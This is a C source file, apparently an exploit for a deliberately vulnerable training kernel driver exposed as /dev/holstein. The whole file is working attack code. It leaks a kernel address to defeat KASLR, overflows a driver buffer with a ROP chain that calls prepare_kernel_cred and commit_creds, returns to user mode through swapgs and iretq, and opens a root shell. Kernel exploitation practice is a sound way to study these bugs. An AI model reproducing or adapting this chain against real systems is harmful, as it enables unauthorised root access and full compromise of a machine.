#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

/* ROPchain leaking kernel address. */
unsigned long int user_rip, user_cs, user_rflags, user_rsp, user_ss;

static void shell() {
  puts("### ROOT SHELL ###");
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  execve("/bin/sh", argv, envp);
}

void save_user_state(){
	asm(
	"movq %%cs, %0\n\t"		
	"movq %%ss, %1\n\t"		
	"movq %%rsp, %2\n\t"
	"pushfq\n\t"	
	"popq %3\n\t" : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp), "=r" (user_rflags) : : "memory");

	printf("State of the userland registers\n\
	\rCS - %ld\n\
	\rSS - %ld\n\
	\rRSP - %ld\n\
	\rRFLAGS - %ld\n", user_cs, user_ss, user_rsp, user_rflags);
};

int main(void){

	save_user_state();

	printf("Running the program...\n");
	int fd = open("/dev/holstein", O_RDWR);


	unsigned long payload[130];
        memset(payload, 'B', 20);
        read(fd, payload, 0x410);
        unsigned long k_base = payload[129] - 0x13d33c;

	printf("Leak %lx\n Kbasee %lx\n", payload[129], k_base);

	unsigned long buff[145];	
	unsigned long g_pop_rdi_ret = k_base + 0x27bbdc; //
	unsigned long g_pop_rcx_ret = k_base + 0x2ea083; // 
	unsigned long g_prepare_kernel_cred = k_base + 0x06e240; //
	unsigned long g_mov_rdi_rax_ret = k_base + 0x60c96b; ;//
	unsigned long commit_cred = k_base + 0x06e390; //

	buff[129] = g_pop_rdi_ret;
	buff[130] = 0;
	buff[131] = g_prepare_kernel_cred;
	buff[132] = g_pop_rcx_ret;
	buff[133] = 0;
	buff[134] = g_mov_rdi_rax_ret;
	buff[135] = commit_cred;
	buff[136] = k_base + 0x800f7c; // swapgs
	buff[137] = 0x41414141;
	buff[138] = k_base + 0x8012c4; // iretq
	buff[139] = 0x41414141;
	buff[140] = (unsigned long)&shell;
	buff[141] = user_cs;
	buff[142] = user_rflags;
	buff[143] = user_rsp;
	buff[144] = user_ss;

	/* prepare data to corruption */
	write(fd, buff, sizeof(buff));
	




	/* read data */
	close(fd);
		
	return 0;
}

